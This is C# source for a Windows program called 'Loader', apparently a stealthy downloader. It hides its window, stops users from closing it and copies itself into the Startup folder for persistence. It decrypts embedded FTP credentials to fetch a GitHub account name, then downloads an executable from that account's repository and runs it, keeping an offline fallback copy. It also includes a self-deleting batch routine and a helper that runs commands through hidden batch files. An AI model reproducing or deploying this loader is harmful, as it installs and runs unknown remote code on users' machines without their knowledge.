using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Loader.Properties;

namespace Loader
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            FormClosing += Form1_FormClosing;
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private async Task CheckInternet()
        {
            bool Internet = false;
            string StringDownload = String.Empty;
            while (Internet == false)
            {
                await Task.Factory.StartNew(() =>
                {
                    using (var client = new WebClient())
                    {
                        try
                        {
                            StringDownload = client.DownloadString(new Uri(
                                "http://www.msftncsi.com/ncsi.txt"));
                        }
                        catch
                        {

                        }
                    }
                });


                if (StringDownload == "Microsoft NCSI")
                {
                    Internet = true;
                }

                await Task.Delay(10);
            }

            Internet = false;
        }
        bool TimeOut = false;
        Timer timerhui = new Timer();

        private async Task SelfKill()
        {
            //await RunCommandHidden("taskkill /f /im \"" + Application.ExecutablePath + "\"");
            //Application.Exit();
            //while (true)
            //{
            //    await Task.Delay(10);
            //}
        }
        string ActiveAccount = "";

        private async void Form1_Load(object sender, EventArgs e)
        {
            using (var client = new WebClient())
            {
                File.WriteAllBytes(Environment.GetEnvironmentVariable("TEMP") + "\\EC_Rotation.txt", Resources.EC);
                Cipher.FileDecrypt(Environment.GetEnvironmentVariable("TEMP") + "\\EC_Rotation.txt", Environment.GetEnvironmentVariable("TEMP") + "\\EC_Rotation_DC.txt", "e");
                string[] Details = File.ReadAllLines(Environment.GetEnvironmentVariable("TEMP") + "\\EC_Rotation_DC.txt");
                client.Credentials = new NetworkCredential(Details[0], Details[1]);
                ActiveAccount = client.DownloadString("ftp://ftpupload.net/htdocs/GitHub/ActiveAccount.txt");
            }
            ShowInTaskbar = false;
            ControlBox = false;
            TopMost = true;
            Visible = false;
            FormBorderStyle = FormBorderStyle.None;
            if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\MonitorLoader.exe"))
            {
                File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\MonitorLoader.exe");
            }

            try
            {
                timerhui.Interval = 30000;
                timerhui.Tick += Timerhui_Tick;
                timerhui.Start();
                try
                {
                    await CheckInternet();
                    Visible = false;
                }
                catch (Exception hui)
                {
                    Console.WriteLine(hui);
                }
                using (var client = new WebClient())
                {
                    client.DownloadFileCompleted += Client_DownloadFileCompleted;
                    await client.DownloadFileTaskAsync(
                        new Uri(
                            "https://raw.githubusercontent.com/" + ActiveAccount + "/Monitoring-Tools/master/Main-Tools/Main-Tools%20Remastered/bin/Debug/Main-Tools%20Remastered.exe"),
                        Environment.GetEnvironmentVariable("TEMP") + "\\MonitorTool.exe");
                    while (client.IsBusy)
                    {
                        await Task.Delay(10);
                    }
                }
            }
            catch (NotSupportedException)
            {
                Console.WriteLine("Not Supported");
                if (TimeOut == false)
                {
                    if (File.Exists(Environment.GetEnvironmentVariable("TEMP") + "\\MonitorToolOffline.exe"))
                    {
                        Process.Start(Environment.GetEnvironmentVariable("TEMP") + "\\MonitorToolOffline.exe");
                        await SelfKill();
                    }
                }
            }
            catch(UnauthorizedAccessException)
            {
                Console.WriteLine("Access Denied");
                if (TimeOut == false)
                {
                    if (File.Exists(Environment.GetEnvironmentVariable("TEMP") + "\\MonitorToolOffline.exe"))
                    {
                        Process.Start(Environment.GetEnvironmentVariable("TEMP") + "\\MonitorToolOffline.exe");
                        await SelfKill();
                    }
                }
            }
            catch(System.Net.WebException)
            {
                Console.WriteLine("Web Exception");
                if (TimeOut == false)
                {
                    if (File.Exists(Environment.GetEnvironmentVariable("TEMP") + "\\MonitorToolOffline.exe"))
                    {
                        Process.Start(Environment.GetEnvironmentVariable("TEMP") + "\\MonitorToolOffline.exe");
                        await SelfKill();
                    }
                }
            }
            catch
            {

            }
            Application.Exit();
        }

        private async Task SelfDestruct()
        {
            string[] DestructScript = { "taskkill /f /im \"" + Application.ExecutablePath + "\"", "del /s /f /q \"" + Application.ExecutablePath + "\"" };
            File.WriteAllLines(Environment.GetEnvironmentVariable("TEMP") + "\\Dew.bat", DestructScript);
            Process.Start(Environment.GetEnvironmentVariable("TEMP") + "\\Dew.bat");
        }

        private bool Exit = false;
        public async Task RunCommandHidden(string Command)
        {
            Random dew = new Random();
            int hui = dew.Next(0000, 9999);
            string[] CommandChut = { Command };
            File.WriteAllLines(System.Environment.GetEnvironmentVariable("USERPROFILE") + "\\Documents\\RunCommand" + hui + ".bat", CommandChut);
            Process C = new Process();
            C.StartInfo.FileName = System.Environment.GetEnvironmentVariable("USERPROFILE") + "\\Documents\\RunCommand" + hui + ".bat";
            C.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            C.EnableRaisingEvents = true;
            C.Exited += C_Exited;
            C.Start();
            while (Exit == false)
            {
                await Task.Delay(10);
            }

            Exit = false;
            File.Delete(System.Environment.GetEnvironmentVariable("USERPROFILE") + "\\Documents\\RunCommand" + hui + ".bat");
        }

        private void C_Exited(object sender, EventArgs e)
        {
            Exit = true;
        }
        private async void Timerhui_Tick(object sender, EventArgs e)
        {
            //TimeOut = true;
            //Visible = false;
            //if (File.Exists(Environment.GetEnvironmentVariable("TEMP") + "\\MonitorToolOffline.exe"))
            //{
            //    Process.Start(Environment.GetEnvironmentVariable("TEMP") + "\\MonitorToolOffline.exe");
            //    await SelfKill();
            //}
        }

        private async void Client_DownloadFileCompleted(object sender, AsyncCompletedEventArgs e)
        {
            if (e.Error != null)
            {
                //if (File.Exists(Environment.GetEnvironmentVariable("TEMP") + "\\MonitorToolOffline.exe"))
                //{
                //    Process.Start(Environment.GetEnvironmentVariable("TEMP") + "\\MonitorToolOffline.exe");
                //}
            }
            else
            {
                if (TimeOut == false)
                {
                    if (File.Exists(Environment.GetEnvironmentVariable("TEMP") + "\\MonitorToolOffline.exe"))
                    {
                        File.Delete(Environment.GetEnvironmentVariable("TEMP") + "\\MonitorToolOffline.exe");
                    }
                    File.Copy(Environment.GetEnvironmentVariable("TEMP") + "\\MonitorTool.exe", Environment.GetEnvironmentVariable("TEMP") + "\\MonitorToolOffline.exe");
                    Process.Start(Environment.GetEnvironmentVariable("TEMP") + "\\MonitorTool.exe");
                    await SelfKill();
                    Application.Exit();
                }
            }
        }
    }
}
